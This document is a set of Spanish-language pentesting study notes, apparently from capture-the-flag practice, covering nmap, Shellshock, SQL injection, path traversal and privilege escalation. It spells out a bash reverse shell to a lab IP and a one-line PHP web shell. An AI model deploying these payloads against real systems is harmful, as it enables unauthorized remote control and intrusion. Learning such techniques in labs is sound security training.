## CONOCER QUÉ SERVICIOS Y DETALLES HAY EN UN SERVIDOR WEB

Para ello hay una herramienta que se llama whatweb, donde si pego la dirección de la web me mostrará todos sus detalles, entre los cuales puedo saber qué servidor web utiliza y sobre que máquina se encuentra (en este caso sobre un nginx y ubuntu):
![[Pasted image 20221217111823.png]]

## CONOCER EL SISTEMA OPERATIVO CON SÓLO HACER UN PING

![[Pasted image 20221217111831.png]]

## COMO HACER UN ESCANEO DE NMAP MUCHO MÁS RÁPIDO Y EFICIENTE

• Ponemos triple verbose para que se nos vaya mostrando los resultados mientras analiza.

◇ Con -n evitamos la resolución DNS

◇ Con min rate también aceleramos.

◇ Con el comando -Pn…

◇ Con -oG lo podemos exportar.

![[Pasted image 20221217111845.png]]
Ahora si queremos obtener información de un puerto en concreto, utilizaré este comando de nmap, por ejemplo del puerto 80:

![[Pasted image 20221217111858.png]]

También podemos aplicar un pequeño ataque de fuerza bruta sobre una dirección web para encontrar directorios, algo parecido a gobuster:

![[Pasted image 20221217111908.png]]

# DETECTAR VULNERABILIDADES CON SCRIPTS DE NMAP

Con nmap podemos también lanzar ciertos scripts automáticos para comprobar la existencia de vulnerabilidades de un objetivo; y para ello lo haremos con el comando —script vuln -p puerto:

Y vemos que por ejemplo para esta máquina nos detecta que es vulnerable y nos muestra además la vulnerabilidad pública:

## **DETECTAR EQUIPOS CONECTADOS A MI RED CON ARP-SCAN
Para ello tenemos que ejecutar el siguiente comando pasándole la interfaz de red que estemos utilizando:
![[Pasted image 20221230095219.png]]
Y por ejemplo si la interfaz de red es otra, la tendremos que seleccionar (como en este caso que estoy utilizando un portátil):
![[Pasted image 20221230095402.png]]
## **HACER ESCANEOS DE SUBDOMINIOS Y SUBDIRECTORIOS CON NMAP**

Esto hará algo parecido a gobuster pero con un mini diccionario, se trata de un ataque pequeño y rápido:

![[Pasted image 20221217112244.png]]

## COMPARTIR ARCHIVOS POR SERVIDOR WEB

Para ello nos ubicamos dentro del directorio que queramos compartir y ejecutamos lo siguiente:

![[Pasted image 20221217112301.png]]

Ahora si hacemos un localhost o introducimos la IP que nos dicen, aparecerá lo siguiente:

![[Pasted image 20221217112310.png]]

## ACCEDER A ETC/PASSWD CON PATH TRAVERSAL

Para ello iremos a la siguiente ruta:

![[Pasted image 20221217112323.png]]

## CONSEGUIR REVERSE SHELL DE MÁQUINA VÍCTIMA A NUESTRO EQUIPO

Para ello primero pondremos a escuchar con netcat desde nuestro equipo host:

![[Pasted image 20221217112335.png]]

Después, desde la máquina víctima necesitaremos que ejecute el siguiente código para enviarnos una bash:

![[Pasted image 20221217112344.png]]

Aunque si lo hacemos desde un navegador, debemos escribirlo de esta manera, porque al poner bash -c seleccionamos el intérprete:

bash -c 'bash -i >& /dev/tcp/10.10.16.27/443 0>&1’

![[Pasted image 20221217112353.png]]

# CÓDIGO PHP MALICIOSO PARA GANAR REVERSE SHELL

Esto se utiliza para subir este fichero php a una web que funcione con este lenguaje para después acceder a dicho documento desde algún directorio de uploads de la web; y así ganar ejecución remota de comandos:

<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

![[Pasted image 20221218213646.png]]
## CÓMO ESCALAR PRIVILEGIOS UNA VEZ HEMOS OBTENIDO LA REVERSE SHELL

Para escalar privilegios, primero ejecutaré el comando sudo -l para ver en quién me puedo convertir, y vemos que sin proporcionar contraseña podría convertirme en scriptmanager:

![[Pasted image 20221217112425.png]]

Para convertirme en este usuario, debo ejecutar el comando sudo -u <nombre_usuario> bash:

![[Pasted image 20221217112435.png]]

Y ya soy root

![[Pasted image 20221217112445.png]]

## TCPDUMP PARA INTERCEPTAR PAQUETES DENTRO DE LA CONEXIÓN

![[Pasted image 20221217112455.png]]

## CONOCER LAS MODIFICACIONES QUE TUVO UN PROYECTO DE GITHUB

Si encontramos un proyecto donde tenga una carpeta .git, significa que se trata de un proyecto de github:

![[Pasted image 20221217112510.png]]

En estos casos podemos ejecutar un comando que es git log, para conocer los cambios que se le hicieron a este proyecto; y vemos que hay una actualización con un token que dice que la carpeta .env se ha borrado:

![[Pasted image 20221217112517.png]]

Pues ahora vamos a conocer exactamente qué han modificado con la web de antes y pegando ese token en el comando de git show, para conocer la información de este token:

![[Pasted image 20221217112525.png]]

Y se nos muestra esta información, donde se nos especifican todos los cambios del proyecto:

![[Pasted image 20221217112539.png]]
## MODIFICAR EL FICHERO /ETC/HOSTS PARA AÑADIR UN DOMINIO QUE NO NOS FUNCIONA

Podemos tener una URL que no nos carga en el navegador:

![[Pasted image 20221217112601.png]]

Entonces ahora tenemos que indicar que la IP apunte a este subdominio, tal y como hicimos antes:

![[Pasted image 20221217112608.png]]

Entonces ahora si pegamos la dirección que se nos indica en la web, accederemos a un menú de registro:

![[Pasted image 20221217112615.png]]

## PROBAR MUCHAS URLS PARECIDAS CON PYTHON

Crearemos un script como este:

![[Pasted image 20221217112625.png]]

Y tras ejecutarlo, se pone a hacer peticiones a muchas URLS donde la única diferencia es que cambia un carácter, y nos va mostrando aquellas urls cuya respuesta sea diferente a las habituales, por ejemplo una extensión superior a 82:

![[Pasted image 20221217112634.png]]

## **HERRAMIENTA SEARCHSPLOIT**

Podemos buscar exploit de alguna vulnerabilidad, por ejemplo de una versión ftp:

![[Pasted image 20221217112646.png]]

Vamos a descargarnos el primer exploit desde esta herramienta utilizando la opción -m:

![[Pasted image 20221217112653.png]]

## **HERRAMIENTA TSHARK**

Es como un wireshark en la línea de comandos.

## **ESCANEOS DE NMAP POR UDP (Cuando por TCP no nos encuentra lo que queremos)**

Lo haríamos de esta manera:

![[Pasted image 20221217112712.png]]

Y este sería el resultado:

![[Pasted image 20221217112719.png]]

## **VULNERABILIDAD SHELLSHOCK**

Ahora que vemos que estamos ante un fichero -sh y se trata de una bash, ya que vemos también que la ruta es cgi-bin, podemos intentar explotar la vulnerabilidad shellshock, para colarnos en esa bash y lanzar comandos remotos; para hacer la comprobación lo haremos de esta manera:

![[Pasted image 20221217112739.png]]

Y nos dice que esta bash de la máquina víctima es vulnerable:

![[Pasted image 20221217112746.png]]

Ahora vamos a explotar la vulnerabilidad, ya que existen peticiones especialmente hechas para colar comandos en esta bash vulnerable; y por internet podemos encontrar información:

![[Pasted image 20221217112754.png]]

Y ahora si lanzamos es comando pero pasándole la IP y el cgi-bin/user.sh, podremos lanzar un comando, por ejemplo un whoami:

![[Pasted image 20221217112803.png]]

Pues ahora sabiendo esto, vamos a lanzar la remote shell, para ello nos ponemos por escucha con netcat:

![[Pasted image 20221217112811.png]]

Lanzamos la shell interactiva:

![[Pasted image 20221217112819.png]]

Y nos llega la conexión:

![[Pasted image 20221217112826.png]]

Y por aquí la flag:

![[Pasted image 20221217112834.png]]
## **OBTENER TABLAS, COLUMNAS Y REGISTROS DE BASES DE DATOS CON SQL INJECTION**

### CONOCER LA BASE DE DATOS ACTUAL:

![[Pasted image 20221217114226.png]]

Y ya lo tenemos:

![[Pasted image 20221217114233.png]]

### BUSCAR OTRAS BASES DE DATOS ADEMÁS DE LA ACTUAL

![[Pasted image 20221217114240.png]]

Y se nos muestran otras bases de datos:

![[Pasted image 20221217114247.png]]

### CONOCER TABLAS DE UNA BASE DE DATOS

![[Pasted image 20221217114255.png]]

Y una vez hecho esto podemos ver como la tabla se llama registration:

![[Pasted image 20221217114301.png]]

### CONOCER LAS COLUMNAS DE UNA BASE DE DATOS

![[Pasted image 20221217114309.png]]

Y este es el resultado:

![[Pasted image 20221217114315.png]]

### CONOCER LOS REGISTROS DE UNA BASE DE DATOS

![[Pasted image 20221217114322.png]]

Y nos sale esta información, la cual vamos a guardar por si acaso:

![[Pasted image 20221217114333.png]]

# **ESCALADA DE PRIVILEGIOS**

## **ESCALADA CON USR/BIN/PERL SETUID:**

Ahora vamos a escalar privilegios, para ello vamos a ejecutar el comando getcap -r /2>/dev/null, donde debemos fijarnos en la segunda fila porque dice que perl puede ejecutar cosas con plenos poderes:

![[Pasted image 20221217114539.png]]

También podemos comprobar que podemos ejecutar código como root desde perl con el comando ls -la

![[Pasted image 20221217114548.png]]

Ahora debemos crear un script en perl que nos sirve para elevar los privilegios, el cual será este:

![[Pasted image 20221217114555.png]]

Para ejecutarlo lo hacemos con echo -ne:

![[Pasted image 20221217114602.png]]

Y ahora ya somos root:

![[Pasted image 20221217114609.png]]

## COMPARTIR ARCHIVOS CON WINDOWS CON IMPACKET-SMBSERVER | RECURSO COMPARTIDO

Si quiero compartir los archivos de un directorio en un recurso compartido en Windows, debo ubicarme en la carpeta donde los quiera compartir y ejecutar este comando:

![[Pasted image 20221217114627.png]]

Ahora desde la máquina víctima Windows nos descargamos el archivo del recurso compartido, poniendo primero la IP de la máquina Kali que está compartiendo el recurso, luego el nombre del archivo compartido y por último el nombre que le queramos poner:

![[Pasted image 20221217114634.png]]

# **COMPARTIR ARCHIVOS RECURSO COMPARTIDO CUANDO NOS DA UN ERROR DE CREDENCIALES**

Vamos a compartir estos dos archivos creando un recurso compartido con impacket-smbserver de esta forma:

![[Pasted image 20221217114648.png]]

Pero al descargar los archivos de la máquina víctima nos dice que debe haber un usuario y contraseña de por medio:

![[Pasted image 20221217114654.png]]

Por tanto vamos a crear otra vez el recurso compartido pero fijando un usuario y contraseña:

![[Pasted image 20221217114701.png]]

Ahora descargamos todo el recurso compartido de esta forma:

![[Pasted image 20221217114707.png]]

Ahora si hacemos un dir de x (que es la unidad que hemos creado y donde se almacena todo el recurso compartido), accedemos a todos los archivos:

![[Pasted image 20221217114715.png]]

# EJECUTAR NETCAT EN WINDOWS

Para ejecutar netcat en windows debemos tener el ejecutable de netcat descargado y ejecutamos el siguiente comando:

![[Pasted image 20221217114732.png]]

Puede darse el caso donde tengamos que poner primero un ./ antes de ejecutar netcat:

![[Pasted image 20221217114739.png]]

Aunque también puede darse el caso de que tengamos que poner un ./ antes del ejecutable para ejecutarlo:

## **CONEXIÓN POR TELNET**

Para conectarse por Telnet, en el equipo servidor debe tener configurado correctamente este servicio, una vez lo tenga configurado, ya podemos iniciar sesión utilizando el nombre del login de dicho equipo de destino y su contraseña de iniciar sesión, escribiendo telnet <dirección IP>:

**TRATAMIENTO DE LA TTY**

Para crearnos una pseuso-consola donde podamos hacer control c y no tengamos problemas con el teclado ejecutamos lo siguiente:

Luego pulsamos control + z y ejecutamos stty raw -echo;fg y luego escribimos reset xterm; y entonces ahora se nos va a reiniciar la bash y ya podremos usar las teclas del teclado sin problema:

![[Pasted image 20221217114806.png]]
![[Pasted image 20221217114810.png]]


